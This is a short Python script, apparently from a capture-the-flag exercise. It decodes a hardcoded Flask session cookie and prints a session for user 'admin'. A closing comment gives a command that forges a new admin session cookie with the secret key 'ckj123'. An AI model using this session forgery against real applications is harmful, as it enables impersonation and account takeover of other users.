#!/usr/bin/env python3
#Session解密
import sys
import zlib
from base64 import b64decode
from flask.sessions import session_json_serializer
from itsdangerous import base64_decode


def decryption(payload):
    payload, sig = payload.rsplit(b'.', 1)
    payload, timestamp = payload.rsplit(b'.', 1)

    decompress = False
    if payload.startswith(b'.'):
        payload = payload[1:]
        decompress = True

    try:
        payload = base64_decode(payload)
    except Exception as e:
        raise Exception('Could not base64 decode the payload because of '
                         'an exception')

    if decompress:
        try:
            payload = zlib.decompress(payload)
        except Exception as e:
            raise Exception('Could not zlib decompress the payload before '
                             'decoding the payload')

    return session_json_serializer.loads(payload)

if __name__ == '__main__':
    s = '.eJw9kEFrwkAQhf9KmbOHxNiL4CGQsETYWQybyM5FUo3JTrK2RMUY8b93K9TDnB5873vzgN1xqM8tLC_DtZ7Bzh5g-YCPL1iCFEWEwoyk4wXq7EbCnyYnJxNKkTMm2WS2ZY9JOkqOA6XzHh1acumIYvNp9H6OE3ZyjhaTeGFczqRLi1z2Mimd-mNyFkg2kXGe60yAIrsrYXxv3sopjZBbp5I1E29Gw7F3KCLayoV3Cr1PJF0WEMcreM5gfx6Ou8t3V5_eE5B7i_N1R7oJyVcafeiU2IRKF3fJaaBEepeCWCXNTXlF0n1P8eqFs65q6jdJFT_mPzlVzgcwtdWpYVvBDK7neni9DsIAnr_qUG08.Ya9auw.1_PyXvN9j2WXHIhquUboAvEIelk'
    print(decryption(s.encode()))
{'_fresh': True, '_id': b'0e74f1e08520db0e6f3650dc423aee41120494e6cbfa14d9a7673d3cb408bdce5b65e05f920f24267bff2f44b28f74da31768f82cf41b00de7ec8e05db72b4f0', 'csrf_token': b'69b7bde85d5fa7d8d59522148a20fc880808e9ed', 'image': b'9JXd', 'name': 'admin', 'user_id': '10'}
#python flask_session_cookie_manager3.py  encode -s ckj123 -t "{'_fresh': True, '_id': b'0e74f1e08520db0e6f3650dc423aee41120494e6cbfa14d9a7673d3cb408bdce5b65e05f920f24267bff2f44b28f74da31768f82cf41b00de7ec8e05db72b4f0', 'csrf_token': b'c3a909ad99e9651dabbae3e822798c1663d9c35b', 'name': 'admin', 'user_id': '10'}"